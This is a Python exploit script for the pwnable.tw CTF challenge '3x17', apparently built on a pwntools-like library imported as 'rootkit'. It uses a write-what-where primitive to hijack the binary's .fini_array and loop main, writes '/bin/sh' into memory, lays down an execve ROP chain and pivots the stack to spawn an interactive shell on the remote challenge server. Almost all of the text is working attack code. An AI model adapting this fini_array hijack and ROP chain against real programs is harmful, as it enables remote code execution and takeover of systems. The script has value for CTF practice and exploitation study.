#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./3x17')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10105)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x402988
continue
'''.format(**locals())

def infite_loop():  # so during exit it loops twice so first main is called and then fini function is recalled and it creates an infinite loop
    write_what_where(fini_array, flat(fini_func, main))

def write_what_where(where, what):
    sa(":", str(where))
    sa(":", what)

fini_array = 0x4b40f0
main = 0x401b6d
flag_bit = 0x4b9330
rop_start = 0x4b4108
fini_func = 0x402960
binsh = 0x4b4238

libc = None
io = start()
infite_loop()
write_what_where(binsh, "/bin/sh\x00")
i=0
rop = seperate(execve(binsh=binsh), n=8)
for gadgets in rop:
    write_what_where(rop_start+i, gadgets)
    i+=8
write_what_where(fini_array, gadget("leave; ret") + gadget("pop rbp; ret"))

io.interactive()